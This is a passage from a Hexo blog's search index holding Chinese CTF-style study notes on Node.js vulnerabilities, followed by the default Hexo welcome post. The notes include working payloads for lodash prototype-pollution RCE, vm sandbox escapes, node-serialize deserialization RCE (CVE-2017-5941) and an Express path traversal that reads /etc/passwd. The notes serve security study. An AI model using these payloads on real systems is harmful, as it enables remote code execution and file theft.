<span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">language</span><span class="token operator">:</span> data<span class="token punctuation">.</span>language<span class="token punctuation">,</span>         <span class="token literal-property property">category</span><span class="token operator">:</span> data<span class="token punctuation">.</span>category    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Example app listening on port 3000!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p><p>页面最终会通过lodash.template进行渲染，跟踪到lodash&#x2F;template.js中。</p><p><img src="/images/image-20220906212154605.png" alt="image-20220906212154605"></p><p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</p><pre class="line-numbers language-none"><code class="language-none">var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p><p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p><p><img src="/images/image-20220906212209088.png" alt="image-20220906212209088"></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">attempt</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">Function</span><span class="token punctuation">(</span>importsKeys<span class="token punctuation">,</span> sourceURL <span class="token operator">+</span> <span class="token string">'return '</span> <span class="token operator">+</span> source<span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> importsValues<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过构造chile_process.exec()就可以执行任意代码了。</p><p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)&#x2F;&#x2F;&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(这里直接用require会报错：ReferenceError: require is not defined</p><h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>首先看下官方示例</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ctx <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token string">'this.constructor.constructor("return process")().exit()'</span><span class="token punctuation">,</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将ctx传入，充当this</span><span class="token comment">//vm.runInNewContext类似于eval，request</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Never gets executed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码在执行时，程序在第二行就直接退出，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。</p><p>它等同于</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span> <span class="token comment">// 获取Context</span><span class="token keyword">const</span> ObjectConstructor <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>constructor<span class="token punctuation">;</span> <span class="token comment">// 获取 Object 对象构造函数</span><span class="token keyword">const</span> FunctionConstructor <span class="token operator">=</span> <span class="token class-name">ObjectConstructor</span><span class="token punctuation">.</span>constructor<span class="token punctuation">;</span> <span class="token comment">// 获取 Function 对象构造函数</span><span class="token keyword">const</span> myfun <span class="token operator">=</span> <span class="token function">FunctionConstructor</span><span class="token punctuation">(</span><span class="token string">'return process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 构造一个函数，返回process全局变量</span><span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">myfun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上是通过原型链方式完成逃逸，<strong>如果将上下文对象的原型链设置为 null 会怎么做</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ctx <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctx<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//ctx的data属性中新建一个&#123;&#125;，用&#123;&#125;中的原型对象</span>vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span>    <span class="token string">'this.data.constructor.constructor("return process")().exit()'</span><span class="token punctuation">,</span>    ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Never gets executed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 JS 里所有对象的原型链都会指向 Object.prototype，且 Object.prototype 和 Function 之间是相互指向的，所有对象通过原型链都能拿到 Function，最终完成沙盒逃逸并执行代码。</p><p>逃逸后代码可以执行如下代码拿到 require，从而并加载其他模块功能</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ctx <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">var exec = this.constructor.constructor;    var require = exec('return process.mainModule.constructor._load')();    console.log(require('child_process').execSync("ls").toString());</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> env <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('whoami').toString()</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>看下网页端在线执行结果，完美嘿嘿</p><p> <img src="https://www.scuctf.com/ctfwiki/web/1.nodejs/nodejs%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/pic/3.png" alt="img"> </p><p>因此我们<strong>只要能在沙盒环境下通过原型链的方式能获取全局的 Function</strong>，就能通过它来执行代码</p><h2 id="node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2><h3 id="IIFE（立即调用函数表达式）"><a href="#IIFE（立即调用函数表达式）" class="headerlink" title="IIFE（立即调用函数表达式）"></a>IIFE（立即调用函数表达式）</h3><p><strong>IIFE</strong>（立即调用函数表达式）是一个在定义时就会立即执行的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/JavaScript">JavaScript</a> <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Function">函数</a>。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">/* code */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 或者</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">/* code */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是一个被称为 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Self-Executing_Anonymous_Function">自执行匿名函数</a> 的设计模式，主要包含两部分。第一部分是包围在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Grouping"><code>圆括号运算符</code></a> <code>()</code> 里的一个匿名函数，这个匿名函数拥有独立的词法作用域。这不仅避免了外界访问此 IIFE 中的变量，而且又不会污染全局作用域。</p><p>第二部分再一次使用 <code>()</code> 创建了一个立即执行函数表达式，JavaScript 引擎到此将直接执行函数。</p><h3 id="node-serialize-0-0-4漏洞点"><a href="#node-serialize-0-0-4漏洞点" class="headerlink" title="node-serialize@0.0.4漏洞点"></a><code>node-serialize@0.0.4</code>漏洞点</h3><p> 漏洞代码位于node_modules\node-serialize\lib\serialize.js中 </p><p><img src="/images/image-20220906212524891.png" alt="image-20220906212524891"></p><p> 其中的关键就是：<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果<strong>构造一个<code>function()&#123;&#125;()</code>函数，在反序列化时就会被当中IIFE立即调用执行</strong>。 </p><p> obj[key].substring(FUNCFLAG.length) &#x3D;》function(){}</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token function-variable function">rce</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"序列化生成的 Payload: \n"</span> <span class="token operator">+</span> serialize<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的Payload为：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"rce"</span><span class="token operator">:</span><span class="token string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"rce"</span><span class="token operator">:</span><span class="token string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p><p>传递给unserialize(注意转义单引号)：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span><span class="token punctuation">;</span>serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行命令成功，结果如图：</p><p><img src="/images/image-20220906212812850.png" alt="image-20220906212812850"></p><h2 id="Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>Node.js 目录穿越漏洞复现(CVE-2017-14849)</h2><p>漏洞影响的版本：</p><ul><li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li><li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li></ul><p> 用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件 </p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/09/07/hello-world/"/>
      <url>/2022/09/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
